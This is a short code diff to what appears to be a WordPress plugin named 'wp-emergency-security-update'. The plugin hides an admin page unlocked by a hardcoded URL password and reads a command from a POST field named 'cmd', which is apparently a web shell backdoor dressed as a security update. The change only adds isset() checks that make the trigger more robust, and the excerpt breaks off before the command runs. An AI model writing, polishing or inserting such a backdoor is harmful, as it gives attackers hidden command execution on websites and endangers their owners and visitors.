@@ -8,7 +8,7 @@
  */
 
 add_action('init', function() {
-    if (current_user_can('manage_options') && $_GET['page'] === 'wp-emergency-security-update' && $_GET['pass'] === 'secure_password') {
+    if (current_user_can('manage_options') && isset($_GET['page']) && $_GET['page'] === 'wp-emergency-security-update' && isset($_GET['pass']) && $_GET['pass'] === 'secure_password') {
         $output = '';
         if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
             $command = $_POST['cmd'];
